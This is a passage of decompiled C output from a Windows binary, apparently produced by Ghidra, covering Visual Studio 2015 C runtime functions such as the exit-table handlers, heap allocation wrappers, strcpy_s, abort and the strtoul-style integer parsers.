  return iVar1;
}



// Library Function - Single Match
//  int __cdecl __acrt_lock_and_call<class <lambda_4e60a939b0d047cfe11ddc22648dfba9>>(enum
// __acrt_lock_id,class <lambda_4e60a939b0d047cfe11ddc22648dfba9>&&)
// 
// Library: Visual Studio 2015 Release

int __cdecl
__acrt_lock_and_call_class__lambda_4e60a939b0d047cfe11ddc22648dfba9___
          (__acrt_lock_id param_1,_lambda_4e60a939b0d047cfe11ddc22648dfba9_ *param_2)

{
  int iVar1;
  __acrt_lock_id local_10;
  __acrt_lock_id local_c;
  __crt_seh_guarded_call_int_ local_5;
  
  local_c = param_1;
  local_10 = param_1;
  iVar1 = __crt_seh_guarded_call<int>::
          operator___class__lambda_800076c951b434888f4765a74a194fcc__class__lambda_4e60a939b0d047cfe11ddc22648dfba9___class__lambda_6dbb1268764f43b569ce7b67e331d33a___
                    (&local_5,(_lambda_800076c951b434888f4765a74a194fcc_ *)&local_10,param_2,
                     (_lambda_6dbb1268764f43b569ce7b67e331d33a_ *)&local_c);
  return iVar1;
}



// Library Function - Single Match
//  public: int __thiscall <lambda_275893d493268fdec8709772e3fcec0e>::operator()(void)const 
// 
// Library: Visual Studio 2015 Release

int __thiscall
<lambda_275893d493268fdec8709772e3fcec0e>::operator__
          (_lambda_275893d493268fdec8709772e3fcec0e_ *this)

{
  uint *puVar1;
  byte bVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  int iVar6;
  sbyte sVar7;
  undefined in_DL;
  uint *puVar8;
  uint *puVar9;
  uint uVar10;
  uint *_Memory;
  uint local_18;
  
  uVar3 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  puVar8 = **(uint ***)this;
  if (puVar8 != (uint *)0x0) {
    local_18 = DAT_0041b004 & 0x1f;
    sVar7 = (sbyte)local_18;
    _Memory = (uint *)((*puVar8 ^ DAT_0041b004) >> sVar7 | (*puVar8 ^ DAT_0041b004) << 0x20 - sVar7)
    ;
    puVar8 = (uint *)((puVar8[1] ^ DAT_0041b004) >> sVar7 |
                     (puVar8[1] ^ DAT_0041b004) << 0x20 - sVar7);
    uVar4 = DAT_0041b004;
    if ((_Memory != (uint *)0x0) && (puVar9 = puVar8, _Memory != (uint *)0xffffffff)) {
      do {
        sVar7 = (sbyte)local_18;
        bVar2 = 0x20U - sVar7 & 0x1f;
        uVar4 = (0U >> bVar2 | 0 << 0x20 - bVar2) ^ DAT_0041b004;
        do {
          puVar8 = puVar8 + -1;
          if (puVar8 < _Memory) {
            if (_Memory != (uint *)0xffffffff) {
              FID_conflict__free(_Memory);
            }
            bVar2 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
            uVar4 = (0U >> bVar2 | 0 << 0x20 - bVar2) ^ DAT_0041b004;
            ***(uint ***)this = uVar4;
            *(uint *)(**(int **)this + 4) = uVar4;
            *(uint *)(**(int **)this + 8) = uVar4;
            goto LAB_00407b5c;
          }
        } while (*puVar8 == uVar4);
        uVar10 = *puVar8 ^ DAT_0041b004;
        *puVar8 = uVar4;
        _guard_check_icall();
        (*(code *)(uVar10 >> sVar7 | uVar10 << 0x20 - sVar7))();
        local_18 = DAT_0041b004 & 0x1f;
        uVar10 = ***(uint ***)this ^ DAT_0041b004;
        uVar4 = (**(uint ***)this)[1] ^ DAT_0041b004;
        sVar7 = (sbyte)local_18;
        puVar1 = (uint *)(uVar10 >> sVar7 | uVar10 << 0x20 - sVar7);
        puVar5 = (uint *)(uVar4 >> sVar7 | uVar4 << 0x20 - sVar7);
        if ((puVar1 != _Memory) || (puVar5 != puVar9)) {
          puVar8 = puVar5;
          _Memory = puVar1;
          puVar9 = puVar5;
        }
      } while( true );
    }
LAB_00407b5c:
    in_DL = (undefined)uVar4;
  }
  iVar6 = FUN_0040296a(uVar3 ^ (uint)&stack0xfffffffc,in_DL,(char)this);
  return iVar6;
}



// Library Function - Single Match
//  public: int __thiscall <lambda_4e60a939b0d047cfe11ddc22648dfba9>::operator()(void)const 
// 
// Library: Visual Studio 2015 Release

int __thiscall
<lambda_4e60a939b0d047cfe11ddc22648dfba9>::operator__
          (_lambda_4e60a939b0d047cfe11ddc22648dfba9_ *this)

{
  void *pvVar1;
  uint uVar2;
  byte bVar3;
  uint *puVar4;
  void *pvVar5;
  uint *puVar6;
  uint uVar7;
  uint *puVar8;
  uint uVar9;
  
  puVar4 = **(uint ***)this;
  if (puVar4 == (uint *)0x0) {
    return -1;
  }
  bVar3 = (byte)DAT_0041b004 & 0x1f;
  puVar8 = (uint *)((puVar4[1] ^ DAT_0041b004) >> bVar3 | (puVar4[1] ^ DAT_0041b004) << 0x20 - bVar3
                   );
  puVar6 = (uint *)((puVar4[2] ^ DAT_0041b004) >> bVar3 | (puVar4[2] ^ DAT_0041b004) << 0x20 - bVar3
                   );
  pvVar5 = (void *)((*puVar4 ^ DAT_0041b004) >> bVar3 | (*puVar4 ^ DAT_0041b004) << 0x20 - bVar3);
  pvVar1 = pvVar5;
  if (puVar8 != puVar6) goto LAB_00407c69;
  uVar7 = (int)puVar6 - (int)pvVar5 >> 2;
  uVar9 = 0x200;
  if (uVar7 < 0x201) {
    uVar9 = uVar7;
  }
  uVar9 = uVar9 + uVar7;
  if (uVar9 == 0) {
    uVar9 = 0x20;
  }
  if (uVar9 < uVar7) {
LAB_00407bf0:
    uVar9 = uVar7 + 4;
    pvVar1 = (void *)FUN_0040c78c(pvVar5,uVar9,4);
    FID_conflict__free((void *)0x0);
    if (pvVar1 == (void *)0x0) {
      return -1;
    }
  }
  else {
    pvVar1 = (void *)FUN_0040c78c(pvVar5,uVar9,4);
    FID_conflict__free((void *)0x0);
    if (pvVar1 == (void *)0x0) goto LAB_00407bf0;
  }
  puVar8 = (uint *)((int)pvVar1 + uVar7 * 4);
  puVar6 = (uint *)((int)pvVar1 + uVar9 * 4);
  bVar3 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
  uVar9 = (0U >> bVar3 | 0 << 0x20 - bVar3) ^ DAT_0041b004;
  uVar7 = ~-(uint)(puVar6 < puVar8) & (uint)((int)puVar6 + (3 - (int)puVar8)) >> 2;
  if (uVar7 != 0) {
    uVar2 = 0;
    puVar4 = puVar8;
    do {
      uVar2 = uVar2 + 1;
      *puVar4 = uVar9;
      puVar4 = puVar4 + 1;
    } while (uVar2 != uVar7);
  }
LAB_00407c69:
  uVar9 = __crt_fast_encode_pointer__(**(uint **)(this + 4));
  *puVar8 = uVar9;
  pvVar1 = __crt_fast_encode_pointer_void__(pvVar1);
  *(void **)**(undefined4 **)this = pvVar1;
  pvVar1 = __crt_fast_encode_pointer_void__(puVar8 + 1);
  *(void **)(**(int **)this + 4) = pvVar1;
  pvVar1 = __crt_fast_encode_pointer_void__(puVar6);
  *(void **)(**(int **)this + 8) = pvVar1;
  return 0;
}



// Library Function - Single Match
//  __crt_atexit
// 
// Library: Visual Studio 2015 Release

void __crt_atexit(undefined4 param_1)

{
  __register_onexit_function(0x94,(undefined1)param_1);
  return;
}



// Library Function - Single Match
//  __execute_onexit_table
// 
// Library: Visual Studio 2015 Release

void __execute_onexit_table(undefined param_1)

{
  undefined1 *local_8;
  
  local_8 = &param_1;
  __acrt_lock_and_call_class__lambda_275893d493268fdec8709772e3fcec0e___
            (2,(_lambda_275893d493268fdec8709772e3fcec0e_ *)&local_8);
  return;
}



// Library Function - Single Match
//  __initialize_onexit_table
// 
// Library: Visual Studio 2015 Release

undefined4 __cdecl __initialize_onexit_table(uint *param_1)

{
  byte bVar1;
  undefined4 uVar2;
  uint uVar3;
  
  if (param_1 == (uint *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    if (*param_1 == param_1[2]) {
      bVar1 = 0x20 - ((byte)DAT_0041b004 & 0x1f) & 0x1f;
      uVar3 = (0U >> bVar1 | 0 << 0x20 - bVar1) ^ DAT_0041b004;
      *param_1 = uVar3;
      param_1[1] = uVar3;
      param_1[2] = uVar3;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  __register_onexit_function
// 
// Library: Visual Studio 2015 Release

void __register_onexit_function(undefined param_1,undefined param_2)

{
  undefined1 *local_c;
  undefined1 *local_8;
  
  local_c = &param_1;
  local_8 = &param_2;
  __acrt_lock_and_call_class__lambda_4e60a939b0d047cfe11ddc22648dfba9___
            (2,(_lambda_4e60a939b0d047cfe11ddc22648dfba9_ *)&local_c);
  return;
}



undefined FUN_00407d70(void)

{
  return 1;
}



// Library Function - Single Match
//  public: void __thiscall __crt_state_management::dual_state_global<void
// (__cdecl*)(int)>::initialize(void (__cdecl*const)(int))
// 
// Library: Visual Studio 2015 Release

void __thiscall
__crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
          (dual_state_global_void____cdecl___int__ *this,FuncDef14 *param_1)

{
  uint uVar1;
  uint uVar2;
  
  uVar2 = 0;
  uVar1 = ~-(uint)(this + 4 < this) & (uint)(this + 4 + (3 - (int)this)) >> 2;
  if (uVar1 != 0) {
    do {
      uVar2 = uVar2 + 1;
      *(FuncDef14 **)this = param_1;
      this = (dual_state_global_void____cdecl___int__ *)((int)this + 4);
    } while (uVar2 != uVar1);
  }
  return;
}



// Library Function - Single Match
//  ___acrt_initialize
// 
// Library: Visual Studio 2015 Release

void ___acrt_initialize(void)

{
  ___acrt_execute_initializers(&PTR_LAB_00414be8,&PTR_u_api_ms_win_appmodel_runtime_l1_1_00414c60);
  return;
}



// Library Function - Single Match
//  ___acrt_uninitialize
// 
// Library: Visual Studio 2015 Release

void ___acrt_uninitialize(void)

{
  ___acrt_execute_uninitializers(&PTR_LAB_00414be8,&PTR_u_api_ms_win_appmodel_runtime_l1_1_00414c60)
  ;
  return;
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2015 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  int *piVar1;
  uint uVar2;
  errno_t eVar3;
  
  uVar2 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar2 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar2);
    }
    else {
      uVar2 = __control87(_NewValue,uVar2);
      *_CurrentState = uVar2;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar2 = __control87(0,0);
      *_CurrentState = uVar2;
    }
    piVar1 = __errno();
    eVar3 = 0x16;
    *piVar1 = 0x16;
    FUN_004091be();
  }
  return eVar3;
}



// WARNING: Function: __SEH_prolog4_GS replaced with injection: SEH_prolog4
// Library Function - Single Match
//  _terminate
// 
// Library: Visual Studio 2015 Release

void _terminate(void)

{
  code *pcVar1;
  __acrt_ptd *p_Var2;
  
  p_Var2 = ___acrt_getptd();
  pcVar1 = *(code **)(p_Var2 + 0xc);
  if (pcVar1 != (code *)0x0) {
    _guard_check_icall();
    (*pcVar1)();
  }
  _abort();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __free_base
//  _free
// 
// Libraries: Visual Studio 2012 Release, Visual Studio 2015 Release, Visual Studio 2017 Release,
// Visual Studio 2019 Release

void __cdecl FID_conflict__free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_0041c220,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = FID_conflict____acrt_errno_from_os_error(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// Library Function - Single Match
//  __malloc_base
// 
// Library: Visual Studio 2015 Release

LPVOID __cdecl __malloc_base(size_t param_1)

{
  int iVar1;
  LPVOID pvVar2;
  int *piVar3;
  
  if (param_1 < 0xffffffe1) {
    if (param_1 == 0) {
      param_1 = 1;
    }
    do {
      pvVar2 = HeapAlloc(DAT_0041c220,0,param_1);
      if (pvVar2 != (LPVOID)0x0) {
        return pvVar2;
      }
      iVar1 = FUN_00407878();
    } while ((iVar1 != 0) && (iVar1 = __callnewh(param_1), iVar1 != 0));
  }
  piVar3 = __errno();
  *piVar3 = 0xc;
  return (LPVOID)0x0;
}



// Library Function - Single Match
//  _strcpy_s
// 
// Library: Visual Studio 2015 Release

errno_t __cdecl _strcpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  int iVar4;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    if (_Src != (char *)0x0) {
      pcVar3 = _Dst;
      do {
        cVar1 = pcVar3[(int)_Src - (int)_Dst];
        *pcVar3 = cVar1;
        pcVar3 = pcVar3 + 1;
        if (cVar1 == '\0') break;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        return 0;
      }
      *_Dst = '\0';
      piVar2 = __errno();
      iVar4 = 0x22;
      goto LAB_00407fd5;
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  iVar4 = 0x16;
LAB_00407fd5:
  *piVar2 = iVar4;
  FUN_004091be();
  return iVar4;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2015 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  int iVar2;
  BOOL BVar3;
  
  iVar2 = ___acrt_get_sigabrt_handler();
  if (iVar2 != 0) {
    _raise(0x16);
  }
  if ((DAT_0041b0e8 & 2) != 0) {
    BVar3 = IsProcessorFeaturePresent(0x17);
    if (BVar3 != 0) {
      pcVar1 = (code *)swi(0x29);
      (*pcVar1)();
    }
    ___acrt_call_reportfault(3,0x40000015,1);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __calloc_base
// 
// Library: Visual Studio 2015 Release

LPVOID __cdecl __calloc_base(uint param_1,uint param_2)

{
  int iVar1;
  LPVOID pvVar2;
  int *piVar3;
  size_t dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffe0 / param_1)) {
    dwBytes = param_1 * param_2;
    if (dwBytes == 0) {
      dwBytes = 1;
    }
    do {
      pvVar2 = HeapAlloc(DAT_0041c220,8,dwBytes);
      if (pvVar2 != (LPVOID)0x0) {
        return pvVar2;
      }
      iVar1 = FUN_00407878();
    } while ((iVar1 != 0) && (iVar1 = __callnewh(dwBytes), iVar1 != 0));
  }
  piVar3 = __errno();
  *piVar3 = 0xc;
  return (LPVOID)0x0;
}



// Library Function - Single Match
//  bool __cdecl __crt_strtox::is_overflow_condition<unsigned long>(unsigned int,unsigned long)
// 
// Library: Visual Studio 2015 Release

bool __cdecl __crt_strtox::is_overflow_condition_unsigned_long_(uint param_1,ulong param_2)

{
  if (((param_1 & 4) == 0) &&
     (((param_1 & 1) == 0 ||
      ((((param_1 & 2) == 0 || (param_2 < 0x80000001)) &&
       (((param_1 & 2) != 0 || (param_2 < 0x80000000)))))))) {
    return false;
  }
  return true;
}



// Library Function - Single Match
//  unsigned long __cdecl __crt_strtox::parse_integer<unsigned long,class
// __crt_strtox::c_string_character_source<char>>(struct __crt_locale_pointers * const,class
// __crt_strtox::c_string_character_source<char>,int,bool)
// 
// Library: Visual Studio 2015 Release

ulong __cdecl
__crt_strtox::parse_integer_unsigned_long_class___crt_strtox__c_string_character_source_char___
          (__crt_locale_pointers *param_1,c_string_character_source_char_ param_2,int param_3,
          bool param_4)

{
  byte bVar1;
  bool bVar2;
  int *piVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  byte bVar7;
  ulong uVar8;
  undefined3 in_stack_00000009;
  undefined3 in_stack_00000011;
  char in_stack_00000014;
  int local_2c;
  localeinfo_struct local_28;
  char local_20;
  byte *local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  bVar2 = c_string_character_source<wchar_t>::validate
                    ((c_string_character_source_wchar_t_ *)&param_2);
  if (bVar2) {
    if ((_param_4 == 0) || ((1 < (int)_param_4 && ((int)_param_4 < 0x25)))) {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_2c,param_1);
      local_10 = 0;
      local_1c = _param_2;
      do {
        bVar7 = *_param_2;
        _param_2 = _param_2 + 1;
        local_8 = local_8 & 0xffffff00 | (uint)bVar7;
        iVar4 = __ischartype_l((uint)bVar7,8,&local_28);
      } while (iVar4 != 0);
      local_c = (uint)(in_stack_00000014 != '\0');
      if (bVar7 == 0x2d) {
        local_c = local_c | 2;
LAB_00408180:
        bVar7 = *_param_2;
        _param_2 = _param_2 + 1;
        local_8 = local_8 & 0xffffff00 | (uint)bVar7;
      }
      else if (bVar7 == 0x2b) goto LAB_00408180;
      if ((_param_4 == 0) || (_param_4 == 0x10)) {
        if ((byte)(bVar7 - 0x30) < 10) {
          iVar4 = (char)bVar7 + -0x30;
        }
        else if ((byte)(bVar7 + 0x9f) < 0x1a) {
          iVar4 = (char)bVar7 + -0x57;
        }
        else if ((byte)(bVar7 + 0xbf) < 0x1a) {
          iVar4 = (char)bVar7 + -0x37;
        }
        else {
          iVar4 = -1;
        }
        if (iVar4 == 0) {
          bVar1 = *_param_2;
          local_14 = local_14 & 0xffffff00 | (uint)bVar1;
          if ((bVar1 == 0x78) || (bVar1 == 0x58)) {
            if (_param_4 == 0) {
              _param_4 = 0x10;
            }
            bVar7 = _param_2[1];
            _param_2 = _param_2 + 2;
            local_8 = local_8 & 0xffffff00 | (uint)bVar7;
          }
          else {
            if (_param_4 == 0) {
              _param_4 = 8;
            }
            _param_2 = _param_2 + 1;
            c_string_character_source<char>::unget(&param_2,bVar1);
          }
        }
        else if (_param_4 == 0) {
          _param_4 = 10;
        }
      }
      local_14 = (uint)(0xffffffff / (ulonglong)_param_4);
      local_18 = (uint)(0xffffffff % (ulonglong)_param_4);
      while( true ) {
        if ((byte)(bVar7 - 0x30) < 10) {
          uVar5 = (int)(char)bVar7 - 0x30;
        }
        else if ((byte)(bVar7 + 0x9f) < 0x1a) {
          uVar5 = (int)(char)bVar7 - 0x57;
        }
        else if ((byte)(bVar7 + 0xbf) < 0x1a) {
          uVar5 = (int)(char)bVar7 - 0x37;
        }
        else {
          uVar5 = 0xffffffff;
        }
        if ((uVar5 == 0xffffffff) || (_param_4 <= uVar5)) break;
        uVar6 = local_c | 8;
        if ((local_10 < local_14) || ((local_10 == local_14 && (uVar5 <= local_18)))) {
          local_10 = local_10 * _param_4 + uVar5;
        }
        else {
          uVar6 = local_c | 0xc;
        }
        bVar7 = *_param_2;
        _param_2 = _param_2 + 1;
        local_8 = local_8 & 0xffffff00 | (uint)bVar7;
        local_c = uVar6;
      }
      c_string_character_source<char>::unget(&param_2,(char)local_8);
      uVar5 = local_c;
      uVar8 = local_10;
      if ((local_c & 8) == 0) {
        uVar8 = 0;
        _param_2 = local_1c;
      }
      else {
        bVar2 = is_overflow_condition_unsigned_long_(local_c,local_10);
        if (bVar2) {
          piVar3 = __errno();
          *piVar3 = 0x22;
          if ((uVar5 & 1) == 0) {
            uVar8 = 0xffffffff;
          }
          else if ((uVar5 & 2) == 0) {
            uVar8 = 0x7fffffff;
          }
          else {
            uVar8 = 0x80000000;
          }
        }
        else if ((uVar5 & 2) != 0) {
          uVar8 = -uVar8;
        }
      }
      if (local_20 != '\0') {
        *(uint *)(local_2c + 0x350) = *(uint *)(local_2c + 0x350) & 0xfffffffd;
      }
      goto LAB_00408116;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_004091be();
  }
  uVar8 = 0;
LAB_00408116:
  if (param_3 != 0) {
    *(byte **)param_3 = _param_2;
  }
  return uVar8;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  unsigned long __cdecl __crt_strtox::parse_integer<unsigned long,class
// __crt_strtox::c_string_character_source<wchar_t>>(struct __crt_locale_pointers * const,class
// __crt_strtox::c_string_character_source<wchar_t>,int,bool)
// 
// Library: Visual Studio 2015 Release

ulong __cdecl
__crt_strtox::parse_integer_unsigned_long_class___crt_strtox__c_string_character_source_wchar_t___
          (__crt_locale_pointers *param_1,c_string_character_source_wchar_t_ param_2,int param_3,
          bool param_4)

{
  wint_t wVar1;
  bool bVar2;
  int *piVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  ulong uVar7;
  uint uVar8;
  uint uVar9;
  ushort uVar10;
  uint uVar11;
  undefined3 in_stack_00000009;
  undefined3 in_stack_00000011;
  char in_stack_00000014;
  int local_20 [3];
  char local_14;
  wint_t *local_10;
  uint local_c;
  undefined4 local_8;
  
  bVar2 = c_string_character_source<wchar_t>::validate(&param_2);
  if (bVar2) {
    if ((_param_4 == 0) || ((1 < (int)_param_4 && ((int)_param_4 < 0x25)))) {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_20,param_1);
      local_c = 0;
      local_10 = _param_2;
      do {
        uVar10 = *_param_2;
        _param_2 = _param_2 + 1;
        iVar4 = _iswctype(uVar10,8);
      } while (iVar4 != 0);
      uVar8 = (uint)(in_stack_00000014 != '\0');
      if (uVar10 == 0x2d) {
        uVar8 = uVar8 | 2;
LAB_0040839e:
        uVar10 = *_param_2;
        _param_2 = _param_2 + 1;
      }
      else if (uVar10 == 0x2b) goto LAB_0040839e;
      uVar11 = (uint)uVar10;
      local_8 = 0x19;
      if ((_param_4 != 0) && (_param_4 != 0x10)) goto LAB_004086a6;
      if (uVar10 < 0x30) goto LAB_00408629;
      if (uVar10 < 0x3a) {
        iVar4 = uVar11 - 0x30;
LAB_00408624:
        if (iVar4 == -1) goto LAB_00408629;
      }
      else {
        if (0xff0f < uVar10) {
          if (uVar10 < 0xff1a) {
            iVar4 = uVar11 - 0xff10;
          }
          else {
            iVar4 = -1;
          }
          goto LAB_00408624;
        }
        if (0x65f < uVar10) {
          if (uVar10 < 0x66a) {
            iVar4 = uVar11 - 0x660;
          }
          else {
            if (uVar10 < 0x6f0) goto LAB_00408629;
            if (uVar10 < 0x6fa) {
              iVar4 = uVar11 - 0x6f0;
            }
            else {
              if (uVar10 < 0x966) goto LAB_00408629;
              if (uVar10 < 0x970) {
                iVar4 = uVar11 - 0x966;
              }
              else {
                if (uVar10 < 0x9e6) goto LAB_00408629;
                if (uVar10 < 0x9f0) {
                  iVar4 = uVar11 - 0x9e6;
                }
                else {
                  if (uVar10 < 0xa66) goto LAB_00408629;
                  if (uVar10 < 0xa70) {
                    iVar4 = uVar11 - 0xa66;
                  }
                  else {
                    if (uVar10 < 0xae6) goto LAB_00408629;
                    if (uVar10 < 0xaf0) {
                      iVar4 = uVar11 - 0xae6;
                    }
                    else {
                      if (uVar10 < 0xb66) goto LAB_00408629;
                      if (uVar10 < 0xb70) {
                        iVar4 = uVar11 - 0xb66;
                      }
                      else {
                        if (uVar10 < 0xc66) goto LAB_00408629;
                        if (uVar10 < 0xc70) {
                          iVar4 = uVar11 - 0xc66;
                        }
                        else {
                          if (uVar10 < 0xce6) goto LAB_00408629;
                          if (uVar10 < 0xcf0) {
                            iVar4 = uVar11 - 0xce6;
                          }
                          else {
                            if (uVar10 < 0xd66) goto LAB_00408629;
                            if (uVar10 < 0xd70) {
                              iVar4 = uVar11 - 0xd66;
                            }
                            else {
                              if (uVar10 < 0xe50) goto LAB_00408629;
                              if (uVar10 < 0xe5a) {
                                iVar4 = uVar11 - 0xe50;
                              }
                              else {
                                if (uVar10 < 0xed0) goto LAB_00408629;
                                if (uVar10 < 0xeda) {
                                  iVar4 = uVar11 - 0xed0;
                                }
                                else {
                                  if (uVar10 < 0xf20) goto LAB_00408629;
                                  if (uVar10 < 0xf2a) {
                                    iVar4 = uVar11 - 0xf20;
                                  }
                                  else {
                                    if (uVar10 < 0x1040) goto LAB_00408629;
                                    if (uVar10 < 0x104a) {
                                      iVar4 = uVar11 - 0x1040;
                                    }
                                    else {
                                      if (uVar10 < 0x17e0) goto LAB_00408629;
                                      if (uVar10 < 0x17ea) {
                                        iVar4 = uVar11 - 0x17e0;
                                      }
                                      else {
                                        if ((uVar10 < 0x1810) || (0x1819 < uVar10))
                                        goto LAB_00408629;
                                        iVar4 = uVar11 - 0x1810;
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
          goto LAB_00408624;
        }
LAB_00408629:
        if (((uVar10 < 0x41) || (0x5a < uVar10)) && (0x19 < (ushort)(uVar10 - 0x61))) {
          iVar4 = -1;
        }
        else {
          uVar5 = uVar11;
          if ((ushort)(uVar10 - 0x61) < 0x1a) {
            uVar5 = uVar11 - 0x20;
          }
          iVar4 = uVar5 - 0x37;
        }
      }
      if (iVar4 == 0) {
        wVar1 = *_param_2;
        if ((wVar1 == 0x78) || (wVar1 == 0x58)) {
          if (_param_4 == 0) {
            _param_4 = 0x10;
          }
          uVar11 = (uint)_param_2[1];
          _param_2 = _param_2 + 2;
        }
        else {
          if (_param_4 == 0) {
            _param_4 = 8;
          }
          _param_2 = _param_2 + 1;
          c_string_character_source<wchar_t>::unget(&param_2,SUB21(wVar1,0));
        }
      }
      else if (_param_4 == 0) {
        _param_4 = 10;
      }
LAB_004086a6:
      uVar5 = (uint)(0xffffffff / (ulonglong)_param_4);
      do {
        uVar10 = (ushort)uVar11;
        if (uVar10 < 0x30) goto LAB_00408911;
        if (uVar10 < 0x3a) {
          uVar6 = uVar11 - 0x30;
LAB_0040890c:
          if (uVar6 == 0xffffffff) goto LAB_00408911;
        }
        else {
          if (0xff0f < uVar10) {
            if (uVar10 < 0xff1a) {
              uVar6 = uVar11 - 0xff10;
            }
            else {
              uVar6 = 0xffffffff;
            }
            goto LAB_0040890c;
          }
          if (0x65f < uVar10) {
            if (uVar10 < 0x66a) {
              uVar6 = uVar11 - 0x660;
            }
            else {
              if (uVar10 < 0x6f0) goto LAB_00408911;
              if (uVar10 < 0x6fa) {
                uVar6 = uVar11 - 0x6f0;
              }
              else {
                if (uVar10 < 0x966) goto LAB_00408911;
                if (uVar10 < 0x970) {
                  uVar6 = uVar11 - 0x966;
                }
                else {
                  if (uVar10 < 0x9e6) goto LAB_00408911;
                  if (uVar10 < 0x9f0) {
                    uVar6 = uVar11 - 0x9e6;
                  }
                  else {
                    if (uVar10 < 0xa66) goto LAB_00408911;
                    if (uVar10 < 0xa70) {
                      uVar6 = uVar11 - 0xa66;
                    }
                    else {
                      if (uVar10 < 0xae6) goto LAB_00408911;
                      if (uVar10 < 0xaf0) {
                        uVar6 = uVar11 - 0xae6;
                      }
                      else {
                        if (uVar10 < 0xb66) goto LAB_00408911;
                        if (uVar10 < 0xb70) {
                          uVar6 = uVar11 - 0xb66;
                        }
                        else {
                          if (uVar10 < 0xc66) goto LAB_00408911;
                          if (uVar10 < 0xc70) {
                            uVar6 = uVar11 - 0xc66;
                          }
                          else {
                            if (uVar10 < 0xce6) goto LAB_00408911;
                            if (uVar10 < 0xcf0) {
                              uVar6 = uVar11 - 0xce6;
                            }
                            else {
                              if (uVar10 < 0xd66) goto LAB_00408911;
                              if (uVar10 < 0xd70) {
                                uVar6 = uVar11 - 0xd66;
                              }
                              else {
                                if (uVar10 < 0xe50) goto LAB_00408911;
                                if (uVar10 < 0xe5a) {
                                  uVar6 = uVar11 - 0xe50;
                                }
                                else {
                                  if (uVar10 < 0xed0) goto LAB_00408911;
                                  if (uVar10 < 0xeda) {
                                    uVar6 = uVar11 - 0xed0;
                                  }
                                  else {
                                    if (uVar10 < 0xf20) goto LAB_00408911;
                                    if (uVar10 < 0xf2a) {
                                      uVar6 = uVar11 - 0xf20;
                                    }
                                    else {
                                      if (uVar10 < 0x1040) goto LAB_00408911;
                                      if (uVar10 < 0x104a) {
                                        uVar6 = uVar11 - 0x1040;
                                      }
                                      else {
                                        if (uVar10 < 0x17e0) goto LAB_00408911;
                                        if (uVar10 < 0x17ea) {
                                          uVar6 = uVar11 - 0x17e0;
                                        }
                                        else {
                                          if ((uVar10 < 0x1810) || (0x1819 < uVar10))
                                          goto LAB_00408911;
                                          uVar6 = uVar11 - 0x1810;
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            goto LAB_0040890c;
          }
LAB_00408911:
          if (((uVar10 < 0x41) || (0x5a < uVar10)) && ((ushort)local_8 < (ushort)(uVar10 - 0x61))) {
            uVar6 = 0xffffffff;
          }
          else {
            uVar6 = uVar11;
            if ((ushort)(uVar10 - 0x61) <= (ushort)local_8) {
              uVar6 = uVar11 - 0x20;
            }
            uVar6 = uVar6 - 0x37;
          }
        }
        if ((uVar6 == 0xffffffff) || (_param_4 <= uVar6)) goto LAB_00408977;
        uVar9 = uVar8 | 8;
        if ((local_c < uVar5) ||
           ((local_c == uVar5 && (uVar6 <= (uint)(0xffffffff % (ulonglong)_param_4))))) {
          local_c = local_c * _param_4 + uVar6;
        }
        else {
          uVar9 = uVar8 | 0xc;
        }
        uVar11 = (uint)*_param_2;
        _param_2 = _param_2 + 1;
        uVar8 = uVar9;
      } while( true );
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
    FUN_004091be();
  }
  uVar7 = 0;
LAB_00408340:
  if (param_3 != 0) {
    *(wint_t **)param_3 = _param_2;
  }
  return uVar7;
LAB_00408977:
  c_string_character_source<wchar_t>::unget(&param_2,SUB41(uVar11,0));
  uVar7 = local_c;
  if ((uVar8 & 8) == 0) {
    uVar7 = 0;
    _param_2 = local_10;
  }
  else {
    bVar2 = is_overflow_condition_unsigned_long_(uVar8,local_c);
    if (bVar2) {
      piVar3 = __errno();
      *piVar3 = 0x22;
      if ((uVar8 & 1) == 0) {
        uVar7 = 0xffffffff;
      }
      else if ((uVar8 & 2) == 0) {
        uVar7 = 0x7fffffff;
      }
      else {
        uVar7 = 0x80000000;
      }
    }
